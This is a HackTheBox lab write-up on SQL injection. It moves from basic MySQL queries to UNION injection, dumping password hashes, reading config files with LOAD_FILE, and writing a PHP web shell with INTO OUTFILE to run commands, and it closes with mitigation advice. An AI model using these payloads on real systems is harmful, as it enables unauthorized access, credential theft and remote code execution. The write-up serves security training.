# HTB-Writeup-SQLInjection
HackTheBox Writeup: SQL Injections - exploitation and mitigation techniques like enumeration, UNION injections, file reading/writing, and RCE for offensive security.

By Ramyar Daneshgar 

## Background

SQL injection is a code injection technique that exploits vulnerabilities in a web application's interaction with its database. It occurs when an attacker manipulates user input to execute arbitrary SQL queries, leading to unauthorized access to data, administrative control, or even remote code execution.

**Types of SQL Injection:**
1. **Classic SQL Injection**: Directly retrieves data by injecting SQL queries.
2. **Union-Based SQL Injection**: Combines results from multiple queries using the `UNION` operator.
3. **Error-Based SQL Injection**: Exploits error messages to gain insights into the database structure.
4. **Blind SQL Injection**: No direct feedback; relies on true/false conditions or time delays.
5. **Time-Based Blind SQL Injection**: Leverages functions like `SLEEP()` to infer results.
6. **Out-of-Band SQL Injection**: Exploits secondary communication channels, like DNS requests.


#### **Intro to MySQL**
**Objective**: Identify the first database in the MySQL instance.

1. **Connect to the MySQL Server**:  
   To connect, I used the `mysql` client with the provided credentials. The `-h` specifies the host, `-P` defines the port, and `-u` and `-p` provide the username and password.
   ```bash
   mysql -h STMIP -P STMPO -u root -ppassword
   ```
   **Rationale**: This establishes a connection to the target database server.

2. **List Databases**:  
   Using the `SHOW databases;` query, I enumerated all databases in the server.
   ```sql
   SHOW databases;
   ```
   **Result**: The output displayed databases such as `employees` and `mysql`.

**Key Takeaway**: Always enumerate databases first to identify potential targets.

---

#### **SQL Statements**
**Objective**: Retrieve the department number for the "Development" department.

1. **Switch to the Target Database**:
   I used the `USE` command to switch to the `employees` database.
   ```sql
   USE employees;
   ```

2. **List Tables**:
   To understand the database's structure, I listed all tables.
   ```sql
   SHOW TABLES;
   ```

3. **Understand Table Schema**:
   I inspected the structure of the `departments` table to identify relevant columns.
   ```sql
   DESCRIBE departments;
   ```

4. **Query Specific Data**:
   Using a `SELECT` statement, I filtered the table for rows where `dept_name = "Development"`.
   ```sql
   SELECT dept_no FROM departments WHERE dept_name="Development";
   ```

**Key Takeaway**: Schema inspection is essential for crafting precise queries.

---

#### **Query Results**
**Objective**: Identify the last name of the employee based on specific conditions.

1. **Inspect Table Structure**:
   I used `DESCRIBE employees;` to confirm the presence of relevant columns (`first_name`, `last_name`, and `hire_date`).
   ```sql
   DESCRIBE employees;
   ```

2. **Query with Conditions**:
   I filtered for employees whose first name starts with "Bar" and hire date is `1990-01-01` using the `LIKE` operator and exact match.
   ```sql
   SELECT last_name FROM employees WHERE first_name LIKE 'Bar%' AND hire_date='1990-01-01';
   ```

**Key Takeaway**: Use filtering operators like `LIKE` and `AND` for precision in multi-condition queries.

---

#### **SQL Operators**
**Objective**: Count records where `emp_no > 10000` or title does not include "engineer."

1. **Inspect Table Structure**:
   I analyzed the schema of the `titles` table.
   ```sql
   DESCRIBE titles;
   ```

2. **Count Records with Conditions**:
   Using the `COUNT()` function, I queried the number of rows satisfying either condition.
   ```sql
   SELECT COUNT(*) FROM titles WHERE emp_no > 10000 OR title NOT LIKE '%engineer%';
   ```

**Key Takeaway**: Aggregate functions like `COUNT()` simplify data analysis without fetching full datasets.

---

#### **Subverting Query Logic**
**Objective**: Bypass login authentication.

1. **Inject Malicious Logic**:
   By injecting `' OR '1' = '1' -- -`, I bypassed the authentication mechanism. This payload always evaluates to true.
   ```sql
   tom' OR '1' = '1' -- -
   ```

**Key Takeaway**: Input validation is critical to prevent unauthorized access.

---

#### **Union Injection**
**Objective**: Use a Union injection to extract information.

1. **Determine Number of Columns**:
   I tested queries with varying numbers of columns until finding the correct match (4 columns).
   ```sql
   ' UNION SELECT 1-- -
   ' UNION SELECT 1,2-- -
   ' UNION SELECT 1,2,3,4-- -
   ```

2. **Inject Data Extraction Function**:
   Injecting `user()` into the query retrieved the database user.
   ```sql
   ' UNION SELECT 1,user(),3,4-- -
   ```

**Key Takeaway**: Matching column counts in Union injections is vital for successful exploitation.

---

#### **Database Enumeration**
**Objective**: Find the password hash for `newuser` in the `users` table.

1. **Enumerate Columns**:
   I queried the `INFORMATION_SCHEMA.COLUMNS` table to list column names in the `users` table.
   ```sql
   foo' UNION SELECT 1,TABLE_SCHEMA,TABLE_NAME,COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users'-- -
   ```

2. **Extract Data**:
   I used a Union injection to retrieve the username and password hash.
   ```sql
   foo' UNION SELECT 1,username,password,4 FROM ilfreight.users-- -
   ```

**Key Takeaway**: The `INFORMATION_SCHEMA` database is a critical resource for understanding database structures.

---

#### **Reading Files**
**Objective**: Extract the database password.

1. **Verify File Privileges**:
   I checked if the current user (`root`) had the `FILE` privilege.
   ```sql
   foo' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
   ```

2. **Load Configuration File**:
   Using `LOAD_FILE()`, I read the contents of `config.php` to extract the database password.
   ```sql
   foo' UNION SELECT 1,LOAD_FILE("/var/www/html/config.php"),3,4-- -
   ```

**Key Takeaway**: Misconfigured privileges can expose sensitive files.

---

#### **Writing Files**
**Objective**: Write a web shell for remote code execution.

1. **Check File Write Permissions**:
   I verified that `secure_file_priv` was unset, allowing unrestricted file writes.
   ```sql
   foo' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables WHERE variable_name="secure_file_priv"-- -
   ```

2. **Write the Web Shell**:
   I used `INTO OUTFILE` to write a PHP web shell to the web root directory.
   ```sql
   foo' UNION SELECT "",'<?php system($_REQUEST["cmd"]); ?>', "", "" INTO OUTFILE '/var/www/html/shell.php'-- -
   ```

3. **Execute Commands**:
   Using the shell, I executed commands to retrieve the flag.
   ```shell
   http://STMIP:STMPO/shell.php?cmd=cat%20../flag.txt
   ```

**Key Takeaway**: File write capabilities can escalate an SQL injection vulnerability into a full system compromise.

---

### Lessons Learned
1. **Input Validation**: Never trust user input. Validate all inputs against strict rules, e.g., using regular expressions or input sanitization functions.
   - **Use Parameterized Queries**: Replace dynamic queries with parameterized ones to prevent SQL injection entirely.

2. **Principle of Least Privilege**: Restrict database users to the minimal permissions required for their role. For example:
   - The web application should not have `FILE` or superuser privileges.

3. **Secure Configuration**: Always set `secure_file_priv` to a specific directory or `NULL` to prevent unrestricted file reads/writes.

4. **Error Suppression**: Avoid exposing database error messages to users as they can leak sensitive information about the database structure.

5. **Regular Audits**: Conduct regular code and configuration audits to identify potential vulnerabilities before attackers can exploit them.

